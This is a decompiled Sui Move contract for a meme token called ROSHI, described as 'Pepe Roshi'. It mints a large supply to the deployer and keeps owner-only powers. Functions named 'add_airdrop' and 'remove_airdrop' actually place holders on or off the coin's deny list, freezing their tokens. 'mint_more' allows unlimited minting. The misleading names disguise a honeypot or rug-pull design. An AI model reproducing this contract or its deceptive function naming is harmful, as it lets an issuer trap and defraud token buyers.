module 0xf58828f7f4329e8df28b597afd8c7fae6ab4c58901315ea5255ee1e6b8e78d3e::ROSHI {
    struct ROSHI has drop {
        dummy_field: bool,
    }

    public entry fun add_airdrop(arg0: &mut 0x2::deny_list::DenyList, arg1: &mut 0x2::coin::DenyCapV2<ROSHI>, arg2: address, arg3: &mut 0x2::tx_context::TxContext) {
        0x2::coin::deny_list_v2_add<ROSHI>(arg0, arg1, arg2, arg3);
    }

    fun init(arg0: ROSHI, arg1: &mut 0x2::tx_context::TxContext) {
        let (v0, v1, v2) = 0x2::coin::create_regulated_currency_v2<ROSHI>(arg0, 6, b"ROSHI", b"Pepe Roshi", b"Pepe Roshi is a perverted Hermit and master of martial arts fueled on @SuiNetwork. He lives on his own isolated island called Kame House, where he may be willing to train students who travel to his doorstep. He is also the originator of the Kamehameha.", 0x1::option::some<0x2::url::Url>(0x2::url::new_unsafe_from_bytes(b"https://movepump.com/_next/image?url=https%3A%2F%2Fapi.movepump.com%2Fuploads%2Froshi_2af779c3a8.jpg&w=640&q=75")), false, arg1);
        let v3 = v0;
        0x2::transfer::public_freeze_object<0x2::coin::CoinMetadata<ROSHI>>(v2);
        0x2::transfer::public_transfer<0x2::coin::Coin<ROSHI>>(0x2::coin::mint<ROSHI>(&mut v3, 10000000000000000, arg1), 0x2::tx_context::sender(arg1));
        0x2::transfer::public_transfer<0x2::coin::TreasuryCap<ROSHI>>(v3, 0x2::tx_context::sender(arg1));
        0x2::transfer::public_transfer<0x2::coin::DenyCapV2<ROSHI>>(v1, 0x2::tx_context::sender(arg1));
    }

    public entry fun mint_more(arg0: &mut 0x2::coin::TreasuryCap<ROSHI>, arg1: u64, arg2: &mut 0x2::tx_context::TxContext) {
        0x2::transfer::public_transfer<0x2::coin::Coin<ROSHI>>(0x2::coin::mint<ROSHI>(arg0, arg1, arg2), 0x2::tx_context::sender(arg2));
    }

    public entry fun remove_airdrop(arg0: &mut 0x2::deny_list::DenyList, arg1: &mut 0x2::coin::DenyCapV2<ROSHI>, arg2: address, arg3: &mut 0x2::tx_context::TxContext) {
        0x2::coin::deny_list_v2_remove<ROSHI>(arg0, arg1, arg2, arg3);
    }

    // decompiled from Move bytecode v6
}

